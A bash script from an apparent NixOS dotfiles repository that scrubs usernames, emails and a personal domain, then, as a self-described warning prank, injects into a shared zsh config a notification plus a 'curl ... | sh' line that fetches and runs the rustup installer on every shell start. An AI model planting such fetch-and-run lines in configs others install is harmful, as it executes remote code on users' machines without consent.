#!/usr/bin/env bash
BYellow='\033[1;33m'
NoColor="\033[0m"
BGreen='\033[1;32m'
dots="$(dirname "$(readlink -f "$0")")"

# Sanitization.
printf "${BGreen}[+] ${BYellow}Sanitizing PII...${NoColor}\n" 
rg --hidden -g '!.git/' -l "\b([^.]+\.)?${USER}kiss\.net\b" "$dots" | while IFS= read -r file; do sed -i -E "s/\b([^.]+\.)?${USER}kiss\.net\b/example.com/g" "$file"; done
rg --hidden -g '!.git/' -l "${USER}" "$dots"| while IFS= read -r file; do sd "${USER}" "USER_NAME"  "$file"; done
rg --hidden -g '!.git/' -l "${USER^}" "$dots"| while IFS= read -r file; do sd "${USER^}" "USER_NAME"  "$file"; done
rg --hidden -g '!.git/' -l "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "$dots" | while IFS= read -r file; do sd "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" "THIS_IS_AN_EMAIL" "$file"; done
fd . "$dots" -e nix -X sed -Ei 's/discord = "(.*?)"/discord = "not this time"/g'
printf "${BGreen}[+] ${BYellow}Installing \"backdoor\" lol${NoColor}\n"
line_to_insert="\t\# Don't just blindly install people's configs. They're not always nice people.\n\t notify-send \"I could have installed a backdoor. Be better.\"\n\tcurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
file_to_inject='nixos/common/configs/zsh.nix'

# Use grep to find lines containing 'extraConfig' and then use sed to insert the line after each match
rg -n 'initExtra' "$file_to_inject" | sed 's/:.*//' | xargs -I{} sed -i '{} a\'"${line_to_insert}" "$file_to_inject"
